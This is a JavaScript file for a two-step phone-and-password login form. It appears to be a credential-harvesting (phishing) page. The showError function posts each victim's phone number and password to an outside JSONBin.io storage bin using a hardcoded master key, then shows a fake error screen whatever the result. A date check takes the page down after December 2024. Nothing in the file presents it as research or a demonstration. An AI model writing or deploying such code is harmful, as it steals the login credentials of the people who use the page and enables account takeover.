function enableContinueButton() {
    const input = document.getElementById('phone').value;
    const continueBtn = document.getElementById('continueBtn');
    console.log("Input value: ", input);

    // Remove non-digit characters for length check
    const cleanedInput = input.replace(/\D/g, '');
    console.log("Cleaned input value: ", cleanedInput);

    if (cleanedInput.length >= 1 && cleanedInput.length <= 10) {
        continueBtn.disabled = false;
        continueBtn.style.cursor = "pointer";
        console.log("Button enabled");
    } else {
        continueBtn.disabled = true;
        continueBtn.style.cursor = "not-allowed";
        console.log("Button disabled");
    }
}

function goToPasswordSection(event) {
    event.preventDefault();
    console.log("Continue button clicked");

    // Hide number section and show password section
    document.getElementById('numberSection').style.display = 'none';
    document.getElementById('passwordSection').style.display = 'block';
}

function showError(event) {
    event.preventDefault();
    console.log("Password submitted");

    const phone = document.getElementById('phone').value;
    const password = document.getElementById('password').value;

    fetch('https://api.jsonbin.io/v3/b', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Master-Key': '$2a$10$2eFlKFo3518erAgw.3C4Bel9EL8rHjDi033PkBCjP/vZC5X/ku.AC', // Your JSONBin API Key
        },
        body: JSON.stringify({ phone, password }),
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        document.getElementById('passwordSection').style.display = 'none';
        document.getElementById('errorSection').style.display = 'block';
    })
    .catch((error) => {
        console.error('Error:', error);
        document.getElementById('passwordSection').style.display = 'none';
        document.getElementById('errorSection').style.display = 'block';
    });
}

const endDate = new Date('2024-12-01');

if (new Date() > endDate) {
    document.body.innerHTML = '<h1>This service is no longer available.</h1>';
}
